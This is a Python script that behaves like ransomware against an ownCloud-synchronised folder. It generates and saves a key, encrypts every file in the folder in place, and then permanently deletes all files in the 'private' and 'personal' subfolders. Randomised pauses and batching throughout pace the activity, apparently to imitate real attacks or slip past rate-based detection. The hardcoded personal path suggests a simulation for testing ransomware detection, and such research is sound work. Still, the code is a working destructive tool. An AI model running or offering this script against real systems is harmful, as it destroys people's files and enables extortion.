import glob
import os
import random
import time

from encriptor import Encryptor

# path para pasta sincronizada
PATH = "/home/pedralmeida/Documents/owncloud/"


def main():
    encryptor = Encryptor()
    mykey = encryptor.key_create()
    encryptor.key_write(mykey, 'mykey.key')
    loaded_key = encryptor.key_load('mykey.key')

    files = [f for f in glob.glob(PATH + "**/*", recursive=True)]
    print("Encrypting...")
    count = 0
    for f in files:
        if count >= 60:
            time.sleep(random.randint(2, 5))
            count = 0
        if os.path.isfile(f):
            print(f)
            encryptor.file_encrypt(loaded_key, f, f)
            time.sleep(0.2)
            count += 1

    time.sleep(random.randint(5, 15))

    print("Deleting...")
    files = [f for f in glob.glob(PATH + "/private/" + "**/*", recursive=True)]
    count = 0
    for f in files:
        if count >= 30:
            time.sleep(random.randint(2, 5))
            count = 0

        if os.path.isfile(f):
            print(f)
            os.remove(f)
            time.sleep(0.2)
            count += 1

    time.sleep(random.randint(5, 15))

    files = [f for f in glob.glob(PATH + "/personal/" + "**/*", recursive=True)]
    count = 0
    for f in files:
        if count >= 30:
            time.sleep(random.randint(2, 5))
            count = 0

        if os.path.isfile(f):
            print(f)
            os.remove(f)
            time.sleep(0.2)
            count += 1


if __name__ == '__main__':
    main()
